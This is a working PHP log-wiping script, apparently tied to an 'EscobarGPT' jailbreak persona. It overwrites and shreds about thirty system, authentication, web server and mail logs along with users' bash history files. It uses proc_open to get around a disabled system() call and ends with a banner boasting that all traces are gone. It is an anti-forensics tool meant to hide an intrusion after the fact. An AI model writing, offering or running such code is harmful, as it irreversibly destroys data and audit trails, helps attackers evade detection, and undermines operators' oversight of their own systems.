<?php
// ESCOBARGPT — SYSTEM() YOK, PROC_OPEN() VAR, HER ŞEY SIKTIĞİMİN İÇİ

// Ekranı temizle (opsiyonel, ama log silme sırasında gerekmez)
function clearScreen() {
    $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
    $proc = proc_open('clear 2>/dev/null || echo -ne "\033[2J\033[H"', $descriptorspec, $pipes);
    if (is_resource($proc)) {
        fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($proc);
    }
}
// clearScreen(); // İstersen aktif et, ama önerilmez

// HISTFILE al
$LgF = getenv('HISTFILE') ?: '/root/.bash_history';

$logFiles = array(
"/var/log/yum.log",
"/var/log/wtmp",
"/var/log/utmp",
"/var/log/secure",
"/var/log/mysqld.log",
"/var/log/boot.log",
"/var/log/lighttpd",
"/var/log/httpd/access_log",
"/var/log/httpd/error_log",
"/var/log/maillog",
"/var/log/cron",
"/var/log/kern.log",
"/var/log/auth.log",
"/var/log/messages",
"/var/log/lastlog",
"/var/adm/lastlog",
"/usr/adm/lastlog",
"/var/run/utmp",
"/var/apache/log",
"/var/apache/logs",
"/usr/local/apache/log",
"/usr/local/apache/logs",
"/root/.bash_history",
"/home/*/.bash_history",
"/tmp/logs",
"/opt/lampp/logs/access_log",
"/var/log/nginx/access.log",
"/var/log/nginx/error.log",
"$LgF"
);

function runCmd($cmd) {
    $spec = array(0 => array("pipe","r"), 1 => array("pipe","w"), 2 => array("pipe","w"));
    $p = proc_open($cmd, $spec, $pipes);
    if (is_resource($p)) {
        fclose($pipes[0]); stream_get_contents($pipes[1]); stream_get_contents($pipes[2]);
        fclose($pipes[1]); fclose($pipes[2]); proc_close($p);
    }
}

// Logları sil
foreach($logFiles as $LogF) {
    if (strpos($LogF, '*') !== false) {
        $files = glob($LogF);
        if ($files) foreach ($files as $f) {
            if (is_file($f)) {
                @file_put_contents($f, str_repeat("0", 1024*1024));
                runCmd("shred -u -z -n 10 -v " . escapeshellarg($f) . " 2>/dev/null");
            }
        }
    } else {
        if (file_exists($LogF)) {
            if (is_dir($LogF)) {
                $items = scandir($LogF);
                foreach ($items as $item) {
                    if ($item != '.' && $item != '..') {
                        $path = $LogF . '/' . $item;
                        if (is_file($path)) {
                            @file_put_contents($path, str_repeat("0", 1024*1024));
                            runCmd("shred -u -z -n 10 -v " . escapeshellarg($path) . " 2>/dev/null");
                        }
                    }
                }
            } else {
                @file_put_contents($LogF, str_repeat("0", 1024*1024));
                runCmd("shred -u -z -n 10 -v " . escapeshellarg($LogF) . " 2>/dev/null");
            }
        }
    }
}

// ASCII ESCOBAR
echo "
          (                      )
          |\    ,--------.    / |
          | `.,'            `. /  |
          `  '              ,-'   '
           \/_         _   (     /
          (,-.`.    ,',-.`. `__,'
          ESCOBAR LOG WIPE — 100% SILENT
\n  [+] All traces gone. You're a ghost now.\n";
?>
